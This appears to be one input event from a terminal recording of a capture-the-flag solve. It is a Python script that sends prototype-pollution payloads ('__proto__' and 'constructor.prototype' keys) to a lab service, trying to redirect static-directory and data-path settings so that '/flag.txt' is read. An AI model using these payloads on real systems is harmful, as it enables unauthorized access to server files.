[3274.380354, "i", "python3 -c '\nimport urllib.request, json\nres = urllib.request.urlopen(\"http://target:8121/examples\")\norig = json.loads(res.read())[\"examples\"][0]\n\n# Test static directories\ndirs = [\"/app/public\", \"/app/static\", \"/public\", \"/static\", \".\", \"./public\", \"./static\", \"/app\"]\nfor d in dirs:\n    o = json.loads(json.dumps(orig))\n    o[\"data\"][\"__proto__.dir\"] = d\n    o[\"data\"][\"constructor.prototype.dir\"] = d\n    req = urllib.request.Request(\"http://target:8121/convert-to-yaml\", method=\"POST\", data=json.dumps(o).encode())\n    req.add_header(\"Content-Type\", \"application/json\")\n    try:\n        r = urllib.request.urlopen(req)\n        msg = json.loads(r.read().decode())[\"msg\"]\n        for p in [f\"/{msg}\", f\"/public/{msg}\", f\"/static/{msg}\"]:\n            try:\n                res2 = urllib.request.urlopen(\"http://target:8121\" + p)\n                if len(res2.read()) != 13:\n                    print(f\"[STATIC] Found file at {p} with dir {d}\")\n            except: pass\n    except Exception as e: print(\"Dir Crash:\", e)\n\n# Test JSON path pollution\npath_vars = [\"dataPath\", \"dbPath\", \"filePath\", \"examplesPath\", \"storePath\", \"databasePath\", \"file\", \"path\"]\nfor pv in path_vars:\n    o = json.loads(json.dumps(orig))\n    o[\"data\"][\"__proto__.\" + pv] = \"/flag.txt\"\n    o[\"data\"][\"constructor.prototype.\" + pv] = \"/flag.txt\"\n    req = urllib.request.Request(\"http://target:8121/convert-to-yaml\", method=\"POST\", data=json.dumps(o).encode())\n    req.add_header(\"Content-Type\", \"application/json\")\n    try: urllib.request.urlopen(req)\n    except: pass\n    \n    try:\n        out = urllib.request.urlopen(\"http://target:8121/examples\").read().decode()\n        if \"flag\" in out.lower() or \"ductf\" in out.lower():\n            print(f\"[DB_PATH] Found flag using {pv}:\", out[:100])\n    except urllib.error.HTTPError as e:\n        print(f\"[CRASH] {pv} caused HTTP {e.code}\")\n    except Exception as e:\n        print(f\"[CRASH] {pv} caused {e}\")\n'\n"]
